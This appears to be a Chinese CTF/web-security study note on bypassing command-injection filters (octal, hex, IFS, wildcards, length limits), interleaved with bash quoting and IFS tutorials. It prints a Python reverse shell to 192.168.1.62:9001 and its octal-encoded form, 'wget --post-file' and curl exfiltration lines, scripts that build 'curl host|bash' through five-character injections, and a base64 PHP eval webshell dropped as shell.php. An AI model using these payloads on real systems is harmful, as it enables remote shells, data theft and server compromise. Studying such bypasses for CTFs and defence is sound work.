有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 ls > dir_listing 在shell中执行应该将当前目录的列表输出到名为dir_listing的文件中. 但是在 exec() 函数的上下文中,该命令将被解释为获取 > 和 dir_listing 目录.
其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 ls "My Directory" 会被解释为 ls '"My' 'Directory"'.

在Base64编码的帮助下, 可以减少这些问题. 它可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.
```

bash -c …   从…中读取命令并执行但是不会带参数  （会先执行命令）

![image-20221009143128127](http://cdn.ayusummer233.top/img/image-20221009143128127.png)

![image-20221009143142643](http://cdn.ayusummer233.top/img/image-20221009143142643.png)



![image-20221009151829872](http://cdn.ayusummer233.top/img/image-20221009151829872.png)

详细解析：

![image-20221009150735014](http://cdn.ayusummer233.top/img/image-20221009150735014.png)

#### 八进制绕过

printf "\154\163"   \154\163是ls  的八进制ASCII编码

$(printf "\154\163") 是执行ls命令相当于$"ls"   但是$(ls)不行

$() $[] 会将里面的字符当做命令执行,由于 执行完成后的输出直接在cli里，相当于直接输入这些输出后回车，所以会报未找到命令

类似![image-20220928174011320](http://cdn.ayusummer233.top/img/image-20220928174011320.png)

![image-20220928172223209](http://cdn.ayusummer233.top/img/image-20220928172223209.png)

\57  :  /

\56 :  .

$(printf$IFS$9"\57")detect$(printf$IFS$9"\56")py  :  /detect.py

payload为：

```
s=__import__("socket").socket(__import__("socket").AF_INET,__import__("socket").SOCK_STREAM);
s.connect(("192.168.1.62",9001));
__import__("os").dup2(s.fileno(),0);
__import__("os").dup2(s.fileno(),1);
__import__("os").dup2(s.fileno(),2);
p=__import__("subprocess").call(["/bin/bash","-i"]);
```

八进制编码为

printf "\163\75\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\163\157\143\153\145\164\50\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\101\106\137\111\116\105\124\54\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\61\71\62\56\61\66\70\56\61\56\66\62\42\54\71\60\60\61\51\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\75\137\137\151\155\160\157\162\164\137\137\50\42\163\165\142\160\162\157\143\145\163\163\42\51\56\143\141\154\154\50\133\42\57\142\151\156\57\142\141\163\150\42\54\42\55\151\42\135\51\73\n"  

最后的\n用来换行

![image-20220928135353105](http://cdn.ayusummer233.top/img/image-20220928135353105.png)

```bash
//这里过滤了-.等符号，只允许0-9a-zA-Z">\\\$();
echo$IFS$9$(printf$IFS$9"\163\75\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\163\157\143\153\145\164\50\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\101\106\137\111\116\105\124\54\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\61\71\62\56\61\66\70\56\61\56\66\62\42\54\71\60\60\61\51\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\75\137\137\151\155\160\157\162\164\
137\137\50\42\163\165\142\160\162\157\143\145\163\163\42\51\56\143\141\154\154\50\133\42\57\142\151\156\57\142\141\163\150\42\54\42\55\151\42\135\51\73")>$(printf$IFS$9"\57")detect$(printf$IFS$9"\56")py
//即echo 'python反弹shell的payload' > /detect.py
```

$IFS$9代替空格

![image-20220928141350619](http://cdn.ayusummer233.top/img/image-20220928141350619.png)

##### IFS

[Shell中的IFS解惑_whuslei的博客-CSDN博客_shell中ifs](https://blog.csdn.net/whuslei/article/details/7187639)

> 介绍

Shell 脚本中有个特殊变量叫 IFS(Internal Field Seprator) ，内部域分隔符、内部字段分隔符。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：

空格、制表符、换行符。

完整定义是The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution.

在从命令替换解析输出和执行变量替换时，shell使用存储在IFS中的值(默认情况下是空格、制表符和换行符)来界定读取的字符和设置命令。

Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell ——子shell中使用。

而 IFS 是一种 set 变量，当 shell 处理"命令替换"和"参数替换"时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量（这三个字符可以有连续多个—-都表示一个作用即分隔变量），然后对特殊字符进行处理，最后重新组合赋值给该变量。

![image-20220928145733195](http://cdn.ayusummer233.top/img/image-20220928145733195.png)

直接输出IFS是看不到的，把它转化为二进制就可以看到了，"040"是空格，"011"是Tab，"012"是换行符"\n" 。最后一个 012 是因为 echo 默认是会换行的。

> IFS修改

Bash shell会将空格、制表符、换行符这三个字符一个或连续的多个当做列表中新字段的开始。例如，`1 2 3`字符串在shell中会当做三个字段1，2，3。如果想要以逗号分隔字段，则要修改IFS的值，修改如下：

```
IFS=','   内部字段分隔符设定为,
```

![image-20220929112631143](http://cdn.ayusummer233.top/img/image-20220929112631143.png)

IFS+=;或IFS+=‘；’  给内部字段分隔符增加;

![image-20220929113127651](http://cdn.ayusummer233.top/img/image-20220929113127651.png)

因为|是将前面的输出作为后面的输入

所以echo $IFS  显示的空格（默认的$IFS的首变量），无法看出来，又因为echo回在最后加上换行，所以echo $IFS|od -b显示echo输出的八进制的ASCII时只有040 012  第一列的0000000  0000002是od命令的相关显示

0000002是变量的内容

“$IFS”是显示所有的$IFS的内容，所以echo "$IFS"|od -b会显示所有$IFS变量内容的八进制的ASCII码

echo是

> Demo

- shell脚本文件test.sh

```
#!/bin/bash
# test IFS

# 以逗号分割字段
IFS=','
for number in $(cat file)  #即 for number in (1,2,3)
do
  echo "Number $number"
done
```

- test.sh用的文件file

```
1,2,3
```

- 运行结果

```
$ ./test.sh 
Number 1
Number 2
Number 3
```

> 注意

- 在shell脚本较大时可能在某些部分需要修改IFS，而某些部分要改回默认的IFS值，操作如下

```
...
IFS.OLD=$IFS
...
IFS=','
...
IFS=$IFS.OLD
...
```

- 需要多个符号作为分隔符，以`:`，`,`，`;`作为分隔符

```
IFS=':;,'
```

如果是用冒号引起来，表示这个变量不用IFS替换

如果不加引号，输出时会根据IFS的值来分割后合并输出

```bash
string2="1  2  3  4"
echo $string2   将string2按照IFS分割后合并输出，由于1  2  3  4之间有IFS规定的界定符所以会被分割，分割后的相邻单元之间用一个空格分隔
echo "$string2" 将string2按照一个单元，不按照IFS分割，直接输出
```

输出：

```powershell
1 2 3 4
1  2  3  4
```

`$IFS`默认是空字符(空格Space、Tab、换行\n)，把相邻的连续的分割符合并到了一起。而利用双引号包裹的字符串实际上是屏蔽了IFS的作用，当我做如下修改的时候那么输出就完全一致了。

```bash
IFS='-'
string2="1  2  3  4"
echo $string2   将string2按照IFS分割后合并输出，由于1  2  3  4之间没有IFS规定的界定符所以不会被分割
echo "$string2" 将string2按照一个单元，不按照IFS分割，直接输出
```

这样就一样了，

```powershell
1  2  3  4
1  2  3  4
```

```bash
IFS='-'
string2="1--2--3--4"
echo $string2  将string2按照IFS分割后合并输出，由于1--2--3--4之间有IFS规定的界定符所以会被分割，分割后的相邻单元之间用一个空格分隔
echo "$string2"将string2按照一个单元，不按照IFS分割，直接输出
```

输出：

```powershell
1  2  3  4
1--2--3--4
```

设置IFS=:;则，IFS只使用第一个：

![image-20220928153049225](http://cdn.ayusummer233.top/img/image-20220928153049225.png)

$

```
$和反引号`（如果反引号里面有数据，则优先处理里面内容）
`$IFS$9` 符号 `${IFS}` 符号  这里解释一下*[Math Processing Error]IFS,*IFS,*[Math Processing Error]IFS*9的区别，首先*[Math Processing Error]IFS在linux下表示分隔符，加一个就固定了变量名，同理在后面加个*可以起到截断作用。
$*和$@，$x(x 代表 1-9)，${x}(x>=10)：比如`ca${21}t a.txt`表示`cat a.txt`           ${21}没有传入参数的情况 下默认为空
Tips.md中详细介绍
```

`$*`和`$@`都是返回所有参数(用户定义的变量)。

$* 会根据 IFS 的不同来组合输出值，而 $@ 则会将值用" "—空格  来组合输出值！

`$*`将所有的参数认为是一个字段，“$*”  则使用IFS来分隔不同字段
`$@`将所有的参数认为是一个字段，"$@"  不划分。

```bash
IFS=:;  IFS= :; 都不行，必须是IFS=:;  不能有中文字符
set x y z
echo $*
输出：x y z
echo "$*"
输出：x:y:z
echo $@
输出：x y z
echo "$@"
输出：x y z
```

![image-20220928152650452](http://cdn.ayusummer233.top/img/image-20220928152650452.png)

上例 set 变量其实是3个参数，而下面这个例子实质是2个参数，即 set "x y z" 和 set x y z 是完全不同的。

set  命令https://blog.csdn.net/cao0507/article/details/82697451

**set：初始化位置参数**

调用 set 是接一个或多个参数时，set 会把参数的值赋予位置参数，从 $1 开始赋值。

**set：显示 shell 变量**

如果不带任何参数的使用 set 命令，set 指令就会显示一列已设置的 shell 变量，包括用户定义的变量和关键字变量

```bash
set "x" "y z"    set "x""y z" 则只有一个参数，无论IFS是什么都不会划分它，因为只有变量$1  set "x" "y z"则有两个变量$1 和 $2
echo $*
输出：x y z
echo "$*"
输出：x:y z
echo $@
输出：x y z
echo "$@"
输出：x y z
echo $* |od -b
输出：
0000000 170 040 171 040 172 012  170：x  171: y 172: z 040: 空格
0000006
echo "$*" |od -b
输出：
0000000 170 072 171 040 172 012   072：冒号：  012：换行
0000006
```

![image-20220928152800825](http://cdn.ayusummer233.top/img/image-20220928152800825.png)

#### 十六进制绕过

echo "636174202F6574632F706173737764" | xxd -r -p|bash                (实际是ASCII码)

![image-20220928160341758](http://cdn.ayusummer233.top/img/image-20220928160341758.png)

![image-20220928163903729](http://cdn.ayusummer233.top/img/image-20220928163903729.png)



#### 十六进制字符序列

值得注意的是，这种方法不适用于所有PHP函数，这种变量函数方法不能用于构造诸如echo、print、unset()、isset()、empty()、include、require等系统特殊函数，但可以使用包装函数来构造它们

```
php -r '"\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");'  #php5会报错 php7不会

Php5编码绕过方式：
php -r '$hexstr="73797374656d";$str=hex2bin($hexstr);$str("cat /etc/passwd");'
  
printf "\x73\x79\x73\x74\x65\x6d"  结果是system且无换行
```

\x73\x79\73\x74\x65\x6d   是ASCII 16进制编码的system   （无和\x都是十六进制编码，不过\x会在字符的编码前加上\x）

![image-20220928165434246](http://cdn.ayusummer233.top/img/image-20220928165434246.png)

![image-20221009165444590](http://cdn.ayusummer233.top/img/image-20221009165444590.png)

![image-20221009170328447](http://cdn.ayusummer233.top/img/image-20221009170328447.png)

```
php -r '\x73\x79\x74\x65\x6d("cat /etc/passwd");' //会报错
php -r '"\x73\x79\x74\x65\x6d"("cat /etc/passwd");'
```

则报错函数不存在![image-20220928165739190](http://cdn.ayusummer233.top/img/image-20220928165739190.png)

![image-20220928165625055](http://cdn.ayusummer233.top/img/image-20220928165625055.png)

```php
<?php

$a="system('cat /etc/passwd');"; //少分号会报错PHP Parse error:  syntax error, unexpected end of file in /home/test.php(4) : eval()'d code
eval($a);
//passthru($str, $out);
?>
```

![image-20221009180157958](http://cdn.ayusummer233.top/img/image-20221009180157958.png)

### PHP执行字符串的php代码：[如何执行字符串的PHP代码 - dormscript - 博客园 (cnblogs.com)](https://www.cnblogs.com/dormscript/p/6163774.html)

- 将字符串代码写到临时文件，然后在项目中include该文件，执行完成再删除这个临时文件
- system exec 之类的系统函数
- php函数eval （会不会有安全问题?）

#### Linux的bash–引号

**换行符是一个特殊字符，表示命令的结束，Bash 收到这个字符以后，就会对输入的命令进行解释执行**。**换行符前面加上反斜杠转义，就使得换行符变成一个普通字符，Bash 会将其当作长度为0的空字符处理，从而可以将一行命令写成多行。**

[Bash 脚本教程（四）引号和转义_weixin_45773632的博客-CSDN博客](https://blog.csdn.net/weixin_45773632/article/details/127031790)

单引号：

Bash 允许字符串放在单引号或双引号之中，加以引用。

单引号用于保留字符的字面含义，各种特殊字符在单引号里面，都会变为普通字符，比如星号（*）、美元符号（$）、反斜杠（\）等。

```bash
[root@VM-4-17-centos for]# echo '*'
*

[root@VM-4-17-centos for]# echo '$USER'
$USER

[root@VM-4-17-centos for]# echo '$((2+2))'
$((2+2))

[root@VM-4-17-centos for]# echo '$(echo foo)'
$(echo foo)
```

上面命令中，单引号使得 Bash 扩展、变量引用、算术运算和子命令，都失效了。如果不使用单引号，它们都会被 Bash 自动扩展。

由于反斜杠在单引号里面变成了普通字符，所以如果单引号之中，还要使用单引号，不能只使用转义。需要在外层的单引号前面加上一个美元符号（$），然后再对里层的单引号转义。（这个方法适用于多层引号的嵌套）

```bash
# 不正确
[root@VM-4-17-centos for]# echo it's

# 不正确
[root@VM-4-17-centos for]# echo 'it\'s'

# 正确
[root@VM-4-17-centos for]# echo $'it\'s'
```

不过，更合理的方法是改在双引号之中使用单引号。

```bash
[root@VM-4-17-centos for]# echo "it's"
it's
```

![image-20221009181338877](http://cdn.ayusummer233.top/img/image-20221009181338877.png)

双引号

双引号比单引号宽松，大部分特殊字符在双引号里面，都会失去特殊含义，变成普通字符。

```bash
[root@VM-4-17-centos for]# echo "*"
*
```

上面例子中，通配符`*`是一个特殊字符，放在双引号之中，就变成了普通字符，会原样输出。这一点需要特别留意，这意味着，**双引号里面不会进行文件名扩展**。

但是，三个特殊字符除外：美元符号（$）、反引号（`）和反斜杠（\）。这三个字符在双引号之中，依然有特殊含义，会被 Bash 自动扩展。

```bash
[root@VM-4-17-centos for]# echo "$SHELL"
/bin/bash

[root@VM-4-17-centos for]# echo "`date`"
Mon Jan 27 13:33:18 CST 2020
```

上面例子中，美元符号（$）和反引号（`）在双引号中，都保持特殊含义。**美元符号用来`引用变量`，反引号则是`执行子命令`。**

```bash
[root@VM-4-17-centos for]# echo "I'd say: \"hello!\""
I'd say: "hello!"

[root@VM-4-17-centos for]# echo "\\"
\
```

上面例子中，反斜杠在双引号之中保持特殊含义，用来转义。所以，可以使用反斜杠，在双引号之中插入双引号，或者插入反斜杠本身。

**双引号还有一个作用，就是保存原始命令的输出格式。**

#### 空格过滤

> linux内置分隔符：${IFS}，$IFS，$IFS$9

> 利用<>重定向符

![image-20220928170501306](http://cdn.ayusummer233.top/img/image-20220928170501306.png)

`$IFS$9` 符号 `${IFS}` 符号
这里解释一下*[Math Processing Error]IFS,*IFS,*[Math Processing Error]IFS*9的区别，首先*[Math Processing Error]IFS在linux下表示分隔符，加一个就固定了变量名，同理在后面加个*可以起到截断作用。

#### >，+过滤

> 对于 >,+ 等 符号的过滤 ，$PS2变量为>，$PS4变量则为+

![image-20220928170521216](http://cdn.ayusummer233.top/img/image-20220928170521216.png)

#### 通配符绕过

```
/???/d?r
/???/d[i]r
/???/di[r]
```

这就是通配符的一个典型运用原理是匹配程序`/bin/dir`

![image-20220928202708404](http://cdn.ayusummer233.top/img/image-20220928202708404.png)

具体看[这篇文章](https://www.linuxidc.com/Linux/2017-05/143547.htm)

`cat`，`vim`等等无法使用去查看`flag`文件

绕过

```
/???/??t h???/f???????
```

或

```
/???/??t h???/????????
```

或结合别的通配符一起使用

```
/??''?/??''[t] [h]''?''?''?/''?''?''?''?''?''?''?''?
```



1、<>重定向符号
2、${IFS} 内部域分隔符
3、空格的另一种写法 \x20
4、{}命令执行 参考链接
5、利用变量进行参数拼接（黑名单绕过）
6、利用单引号或者双引号（单双引号成对出现代表空字符串）
7、利用$和反引号`（如果反引号里面有数据，则优先处理里面内容）
8、利用shell结束符;分号
9、利用逻辑符号&& ||

ps：windows考虑 ^链接
#### 关键词绕过

>- 通过拆分命令达到绕过的效果：`a=l;b=s;$a$b`
>- 空变量绕过：`cat fl${x}ag` `cat tes$(z)t/flag`
>- 控制环境变量绕过：
>  先利用`echo $PATH`得到环境变量 => "/usr/local/….blablabla”
>  接着利用`echo ${#PATH}`得到长度
>  然后要哪个字符截取哪个字符就行
>  ${PATH:0:1} => ‘/’
>  ${PATH:1:1} => ‘u’
>  ${PATH:0:4} => ‘/usr’
>- 空值绕过：`cat fl""ag` `cat fl''ag` `cat "fl""ag"`
>- 反斜杠绕过：`ca\t flag` `l\s`

![image-20220928171245058](http://cdn.ayusummer233.top/img/image-20220928171245058.png)

![image-20220928171907691](http://cdn.ayusummer233.top/img/image-20220928171907691.png)

#### 空变量

>$*和$@，$x(x 代表 1-9)，${x}(x>=10)：比如`ca${21}t a.txt`表示`cat a.txt`           ${21}没有传入参数的情况 下默认为空
>在没有传入参数的情况下，这些特殊字符默认为空，如下:
>
>- wh$1oami
>- who$@ami
>- whoa$*mi

#### 花括弧的用法

>在Linux bash中还可以使用`{OS_COMMAND,ARGUMENT}`来执行系统命令`{cat,flag}`  从而可以绕过对网站分隔符的过滤

![image-20220928190655525](http://cdn.ayusummer233.top/img/image-20220928190655525.png)

#### 无回显的命令执行

>可以通过curl命令将命令的结果输出到访问的url中：
>
>curl www./`whoami`

在服务器日志中可看到：`xx.xx.xx.xx - - [12/Aug/2019:10:32:10 +0800] "GET /root HTTP/1.1" 404 146 "-" "curl/7.58.0"`，这样，命令的回显就能在日志中看到了

#### 读文件命令

> ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sort|cut|xxd

无回显的情况下wget带出：`wget --post-file flag(文件名) 47.100.120.123:2333`

https://blog.csdn.net/lizw1912/article/details/119835083

创建文件： touch命令

touch命令创建了你指定的新文件，并将你的用户名作为新文件的属主。但是文件的大小是零，因为只是创建了一个空文件。touch命令还可以用来改变文件的修改时间，这个操作并不需要改变文件的内容。

复制文件： cp命令

cp        source        destination

如果目标文件已经存在，cp命令可能并不会提醒这一点，最好加上 -i 选项，强制shell询问是否覆盖已有文件。

cp -R 命令，可以用它在一条命令中递归地复制整个目录的内容。

制表键自动补全，制表键自动补全允许你在输入文件名或目录名时按一下制表键，让shell帮忙将内容补充完整。

链接文件

符号链接：ln -s

硬链接: ln

重命名文件：mv命令

mv命令只影响文件名，但是inode编号和时间戳保持不变。

删除文件：rm命令

处理目录

创建目录： mkdir命令

要想同时创建多个目录和子目录，需要加入 -p 参数。 mkdir -p 

删除目录：rmdir命令。

默认情况下。rmdir命令只能删除空目录。

rmdir -r 命令可以向下进入目录，删除其中的文件，然后再删除目录本身

rmdir -rf 命令可以一口气删除目录及其所有内容。

查看文件内容

file命令：它能够探测文件的内部，并决定文件是什么类型的。

查看整个文件：

cat命令：cat命令是显示文本文件中所有数据的得力工具。

cat -n :给所有行加上行号

cat -b:给有文本的行加上行号

cat -T: 不让制表符出现

more命令：显示文本文件的内容，但会在显示每页数据之后停下来

less命令： 除了支持more命令相同的命令集，它还包含更多的选项。

查看部分文件：

tail命令： 会显示文件最后几行的内容。默认是10行，也可以加-n，控制行数。

head命令：会显示文件开头那些行的内容。 -n

#### 命令分隔符

linux下

`%0a` 符号
换行符
`%0d` 符号
回车符
`;` 符号
表示连续指令
`&` 符号
表示将前一个命令设置进入后台
`|` 符号
管道符，将前一个命令的输出作为后一个命令的输入
`&&` 符号
前一个命令执行成功才会执行下一条命令
`||` 符号
前一个命令执行失败才会执行下一条命令

#### 黑名单绕过

`a=l;b=s;$a$b`   Linux的bash语法

base64编码

#### 短命令执行

p神的七字命令执行，hitcon的orange出了题五字和四字的

可以看到`>`这个重定向符号可以来创建文件，其中文件名是`>`后面跟的参数，然后创建出我们精心构造好的多个文件名，然后通过`ls`打印出来再重定向`>`到一个木马文件中，就可以执行了。

拼接方法：

1. 一个反斜杠`\`，这种方法是将一次输入分成多次输入，以`\`换下一次，以`p`结束。这种方法的话创建的文件名是按照我们的输入正常排列好的，所以我们不需要添加`-t`来重新排序，如下面的七字绕过实例。
2. 两个反斜杠`\\`，这种方法是利用`\`来拼接字符串，其中前一个`\`是用来反义后一个`\`的。这种方法的话需要精心构造输入，利用倒叙来输入，然后`ls`的时候需要加`-t`参数来排列一下，如下图以及五字四字绕过，虽然报错了但是也执行成功了。

##### 七字绕过

代码如下：

```php
<?php
if(strlen($_GET[1])<8){
     echo shell_exec($_GET[1]);
}
?>
```

很简单的代码，绕过长度限制就可以执行任意命令,利用代码如下:

```
1>wget\     #这里是执行命令1  生成结果写入wget\文件，即使命令报错也会生成文件wget
>域名.\         # 如果在命令行里输入\后回车，进入下一行自动显示的>
>com\         #但是这里是执行命令>com\  就是生成文件名为com\的文件
>-O\
>she\
>ll.p\
>p
ls>a
sh a
```

![image-20220929104641815](http://cdn.ayusummer233.top/img/image-20220929104641815.png)

上面是生成文件wget

![image-20220929104714323](http://cdn.ayusummer233.top/img/image-20220929104714323.png)

上面是生成文件wgetp

![image-20220929105527285](../../../../../AppData/Roaming/Typora/typora-user-images/image-20220929105527285.png)

上面相当于执行命令1>wget>baidu.>com>-O>she>ll.p>p

上面的代码其实是先创建一系列的文件（这些文件名为要执行的长命令的一部分）

然后在目标服务器创建个文件名为a的文件，内容为’wget 域名.com -O shell.pp’
代码含义就是去执行我们自己的vps上的一个木马文件（域名.com上的文件，保存到本地的shell.pp木马文件）

**这里有一点特别值得注意的。这里注意.不能作为文件名的开头，因为linux下.是隐藏文件的开头，ls列不出来**

删除文件

![image-20220929105658505](http://cdn.ayusummer233.top/img/image-20220929105658505.png)

##### 五字绕过

源代码如下:

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

观察可得，每个用户的操作目录独立，而且可以执行长度小于等于5的命令，那么不用担心别人文件干扰。
唯一值得注意的是因为长度要小于5，所以我们无法执行`ls -t>a`
接下来看一下orange的官方wp：

```python
import requests
from time import sleep
from urllib import quote
payload = [
    # generate `ls -t>g` file
    '>ls\\',  # 最后相当于exec('>ls\\')  生成文件ls\
    'ls>_',   #  将ls命令的输出写入到_文件里
    '>\ \\',  #  生成[空格]\文件
    '>-t\\',  #  生成-t\文件
    '>\>g',   #  生成>g文件
    'ls>>_',  #  ls>>_
    # generate `curl orange.tw.tw>python`
    # curl shell.0xb.pw|python
    '>on', 
    '>th\\', 
    '>py\\',
    '>\|\\', #\|用来转义|从而使其能被输出。而不被当做特殊字符
    '>pw\\', 
    '>x.\\',
    '>xx\\', 
    '>l.\\', 
    '>el\\', 
    '>sh\\', 
    '>\ \\',   #\[空格]  用来输出空格
    '>rl\\', 
    '>cu\\', 
    # exec
    'sh _', 
    'sh g', 
]
r = requests.get('http://xxx/web1.php/?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://xxx/web1.php/?cmd=' + quote(i) )
    print i
    sleep(0.2)
```

注意看

```
>ls\\
ls>_
>\ \\
>-t\\
>\>g
ls>>_
```

这几行代码，因为我们提到不能用`ls -t>g`来排序，所以我们需要用合理的分割方式和预写入来控制写入文件的内容

##### 四字绕过

代码如下：

```python
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
?>
```

这题就是大佬们自己嗨了…最大的问题还是`ls -t>g`这个问题，所以如果我们构造成`ls -th>g`，然后逆序分割：

```
dir
sl
g\>
ht-
```

然后逆序输出到文件

这里就可以看出为什么构造`ls -th>g`，因为这个时候可以看到目录遍历的时候，`ht-`跑到了`g>`后面(大佬就是会牛逼…)，这时候完美的构造出了我们需要的命令，后面命令基本不变。

后面如果有别的继续补充吧…

#### 长度绕过

> Linux命令执行的时候可以使用反斜杠换行；bash脚本中同样适用上面的规则；可以用文件名加反斜杠构成命令，使用ls -t > o 将文件名输出到文件o，使用bash o执行脚本

![在这里插入图片描述](http://cdn.ayusummer233.top/img/20210528091115666.png)

\`.. > 0\`    中..是省略号代表命令

构造 ls -t

```
命令：>ls\\			#生成一个文件名为ls\的文件
命令：ls>_			#为了确保ls -t 中ls在前面，所以要先使用ls>_将ls输入到文件_中
命令：>\ \\			#生成ls -t之间的空格，一个文件名为 \的文件
命令：>-t\\			#生成文件名为-t\的文件
命令：>\>g			#生成文件名为>g的文件
命令：ls>>_			#将所有的文件名追加写到文件_里
命令：sh _			#由上至下按顺序执行由\拼接起来的ls -t命令，并将结果输入到文件g中
```

![image-20220929103240373](http://cdn.ayusummer233.top/img/image-20220929103240373.png)

```python
import requests
from time import sleep
import urllib

payload = [
    # generate `ls -t>g` file  #生成文件内容为 ls -t>g  的文件
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 
    
    # generate `curl www.rayi.vip|bash` 
    # 注意文件名不能以.开头
    # 注意文件名不能有重复
    # 注意vps只能用index，因为文件名不能以/开头
    # 悲剧的是我的vps的ip正好有俩0.，只能用域名了
    '>sh\ ', 
    '>ba\\', 
    '>\|\\',
    '>p\\',
    '>vi\\',
    '>i.\\', 
    '>y\\',
    '>ra\\', 
    '>w.\\', 
    '>ww\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 
    # exec
    'sh _', 
    #先执行ls -t>g
    'sh g'
   
]

r = requests.get('http://url/?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://url/?cmd=' + urllib.parse.quote(i) )
    print(i)
    sleep(1)
```

#### get_defined_functions

>get_defined_functions系统函数会返回一个多维数组，该数组包含一个所有已定义函数（包括内部函数和用户定义函数）列表；内部函数可以通过`$arr["internal"]`来表示，用户定义的函数可以使用`$arr["user"]`来表示,arr  是get_defined_functions得到的数组
>例如：php -r 'print_r(get_defined_functions()[internal]);'

![image-20220929124041796](http://cdn.ayusummer233.top/img/image-20220929124041796.png)

```
 php -r 'print_r(get_defined_functions());'    
```

<img src="http://cdn.ayusummer233.top/img/image-20220929123434789.png" alt="image-20220929123434789" style="zoom:80%;" />![image-20220929123500140](../../../../../AppData/Roaming/Typora/typora-user-images/image-20220929123500140.png)

以上就是在不使用系统函数的名称的情况下引用系统函数的另一种方式，如果我们筛选字符串`"system"`，可以找出它的索引号，并利用这种方式使用它：`php -r 'print_r(get_defined_functions()[internal]);' | grep 'system'`

通过获取数组元素来绕过

![image-20220929124106059](http://cdn.ayusummer233.top/img/image-20220929124106059.png)

利用这种方式绕过WAF和代码中的安全过滤：

![在这里插入图片描述](http://cdn.ayusummer233.top/img/20210528114446389.png)

#### 字符数组

```
PHP中的每个字符串都可视为一个字符数组，并且可以通过语法$string[2]或 $string[-3]来引用单个字符，这同时也是另一种绕过安全规则的方法  string是字符串名
例如，仅仅使用字符串$a="elmsty/ ";，我就可以组成命令执行语句system("ls /tmp");(测试PHP版本>7.0)
```

![在这里插入图片描述](http://cdn.ayusummer233.top/img/20210528145804484.png)

#### 引号逃逸

```
在PHP中字符串并不总是伴随着引号我们可以主动声明它的类型，像例如`$a = (string)foo;`在这种情况下，变量`$a`就是字符串`“foo”`
```

此外，还可以使用圆括号，如下图：

![在这里插入图片描述](http://cdn.ayusummer233.top/img/20210528144140685.png)

```bash
第一种绕过方式：使用(system)(ls);，但因为不能使用“system”这个字符串，所以我们可以用字符串连接，例如(sy.(st).em)(ls);  或者a=sys;b=tem;$a$b
```

![在这里插入图片描述](http://cdn.ayusummer233.top/img/20210528144414796.png)

```bash
第二种绕过方式：使用变量$_GET，如果我发送这样一个请求?a=system&b=ls&cmd=$_GET[a]($_GET[b]);，在代码执行中$_GET[a]和$_GET[b]会被system和ls所替代，最终绕过引号的安全限制
```

![在这里插入图片描述](http://cdn.ayusummer233.top/img/20210528144844834.png)

### 信息外带：

https://mp.weixin.qq.com/s/oCGYRX57xGIdPnWfp4s27A

#### 写入文件

若服务器开放了web服务，可以将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果。
若不知道服务器绝对路径的话，通过寻找偏僻名字的js或jpg等文件，然后通过寻找这个文件的路径，将命令执行的结果写入到这个路径里面

#### 管道符

在有写入权限的情况下，直接利用漏洞写入一句话：

```bash
echo PD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg== | base64 -d > shell.php
```

#### DNSlog外带

```bash
利用域名解析请求
